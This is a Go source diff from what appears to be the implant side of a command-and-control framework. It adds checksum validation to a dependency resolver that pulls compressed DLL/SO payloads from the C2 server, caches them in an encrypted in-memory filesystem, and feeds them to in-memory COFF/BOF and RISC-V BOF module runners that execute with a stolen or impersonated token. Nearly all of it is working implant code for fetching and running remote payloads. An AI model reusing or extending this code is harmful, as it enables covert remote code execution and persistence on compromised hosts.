@@ -20,6 +20,10 @@ import (
 
 var fetchFile = c2transport.FetchFile
 
+// downloadDependency fetches a dependency's compressed hosted archive. It is a
+// variable so tests can stub the transport.
+var downloadDependency = c2transport.DownloadViaC2
+
 // ModuleRunOption configures one module execution.
 type ModuleRunOption func(*moduleRunConfig)
 
@@ -29,6 +33,10 @@ type moduleRunConfig struct {
 	// notify streams output to the operator as it is produced. Nil disables
 	// streaming.
 	notify func(string)
+	// dependencyChecksum is the SHA-256 of the uncompressed loader image the
+	// C2 expects for this run. The resolver uses it to validate a cached
+	// dependency instead of trusting or re-downloading it blindly.
+	dependencyChecksum string
 }
 
 // WithNotifier streams module output to the operator while it is still
@@ -36,6 +44,12 @@ type moduleRunConfig struct {
 // captures use it to report events as they happen.
 func WithNotifier(fn func(string)) ModuleRunOption {
 	return func(c *moduleRunConfig) { c.notify = fn }
+}
+
+// WithDependencyChecksum supplies the SHA-256 of the loader image the C2 built
+// for this run.
+func WithDependencyChecksum(checksum string) ModuleRunOption {
+	return func(c *moduleRunConfig) { c.dependencyChecksum = checksum }
 }
 
 // Wire the generic in-memory dependency resolver. coffloader, libbpf and any
@@ -49,15 +63,15 @@ func init() {
 // fetchDependency resolves a named DLL/SO dependency: encrypted memfs cache
 // first, then the C2-hosted <name>.<arch>.gz payload. The file extension is
 // platform-determined (.dll on Windows, .so elsewhere).
-func fetchDependency(name string) ([]byte, error) {
+// fetchDependency resolves a dependency image, using the encrypted memfs
+// archive when it matches the checksum the C2 sent for this run. A stale
+// archive is evicted and replaced with one fresh C2 download; a valid one is
+// reused without any network I/O. checksum is the SHA-256 of the uncompressed
+// image and may be empty when the caller has no C2-provided identity.
+func fetchDependency(name, checksum string) ([]byte, error) {
 	name = strings.ToLower(name)
-	rawKey := "memfs:///" + name + dependencyExt()
-	if cached, err := util.ReadFileAgent(rawKey); err == nil && len(cached) > 0 {
-		logging.Debugf("fetchDependency: hit memfs cache %s", rawKey)
-		return cached, nil
-	}
-
 	hostedName := fmt.Sprintf("%s.%s.gz", name, runtime.GOARCH)
+
 	compressed, err := fetchFile(common.RuntimeConfig, "", hostedName, "", "")
 	if err != nil {
 		return nil, fmt.Errorf("fetching %s: %w", hostedName, err)
@@ -66,18 +80,32 @@ func fetchDependency(name string) ([]byte, error) {
 	if err != nil {
 		return nil, fmt.Errorf("decompressing %s: %w", hostedName, err)
 	}
-	if err := util.WriteFileAgent(rawKey, data, 0o600); err != nil {
-		logging.Debugf("fetchDependency: caching %s failed: %v", rawKey, err)
+	if checksum == "" || crypto.SHA256SumRaw(data) == checksum {
+		return data, nil
+	}
+
+	// The cached archive is stale. Drop both cache keys and fetch the current
+	// archive straight from the C2: a peer may still advertise the same stale
+	// copy that FetchFile just returned.
+	logging.Infof("Dependency %s cache does not match the requested image; refreshing", name)
+	_ = util.RemoveFileAgent(c2transport.MemFSKey(hostedName))
+	_ = util.RemoveFileAgent(hostedName)
+	compressed, err = downloadDependency(common.RuntimeConfig, hostedName, "", "")
+	if err != nil {
+		return nil, fmt.Errorf("refreshing %s: %w", hostedName, err)
+	}
+	data, err = util.Decompress(compressed)
+	if err != nil {
+		return nil, fmt.Errorf("decompressing %s: %w", hostedName, err)
+	}
+	if crypto.SHA256SumRaw(data) != checksum {
+		return nil, fmt.Errorf("dependency %s failed checksum verification", name)
+	}
+	// Replace the stale archive so the next run is a cache hit.
+	if err := util.WriteFileAgent(c2transport.MemFSKey(hostedName), compressed, 0o600); err != nil {
+		logging.Debugf("Caching dependency %s failed: %v", hostedName, err)
 	}
 	return data, nil
-}
-
-// dependencyExt is the extension dependency payloads use on this platform.
-func dependencyExt() string {
-	if runtime.GOOS == "windows" {
-		return ".dll"
-	}
-	return ".so"
 }
 
 // ModuleHandler downloads and runs modules from C2 using resolved, typed invocation data
@@ -154,7 +182,7 @@ func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum str
 	case "coff":
 		err = executeWithToken(invocation.Token, func(token uintptr) error {
 			var execErr error
-			out, execErr = runCOFFModule(payload_data, invocation, token)
+			out, execErr = runCOFFModule(payload_data, invocation, token, runCfg.dependencyChecksum)
 			if execErr != nil {
 				out = logging.Sprintf("running COFF module: %v", execErr)
 			}
@@ -182,22 +210,14 @@ func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum str
 		}
 		return out
 	case "rv":
-		// Portable BOF: an RV32 ET_REL object relocated against the
-		// interpreter's embedded Beacon/libc runtime and called at its
-		// coff_export. The interpreter dependency (rvvm_linux or rvvm_windows)
-		// is mapped only for this run and unmapped by memdeps.Use.
-		var libs [][]byte
-		for _, memPath := range moduleFiles {
-			data, readErr := util.ReadFileAgent(memPath)
-			if readErr != nil {
-				return logging.Sprintf("reading RISC-V library %s: %v", memPath, readErr)
-			}
-			libs = append(libs, data)
-		}
-		out, err = rvvm.RunRiscvBof(payload_data, invocation.Coff.Export,
-			modconfig.CoffArgsFromResolved(invocation.Coff), libs)
+		// Portable BOF: a static RV32 musl executable. The interpreter
+		// dependency (rvvm_linux) is mapped only for this run and unmapped by
+		// memdeps.Use.
+		out, err = rvvm.RunRiscvBof(payload_data,
+			modconfig.CoffArgsFromResolved(invocation.Coff),
+			memdeps.WithChecksum(runCfg.dependencyChecksum))
 		if err != nil {
-			out = logging.Sprintf("running RISC-V module: %v", err)
+			out = logging.Sprintf("running rv module: %v", err)
 		}
 		return out
 	case "so":
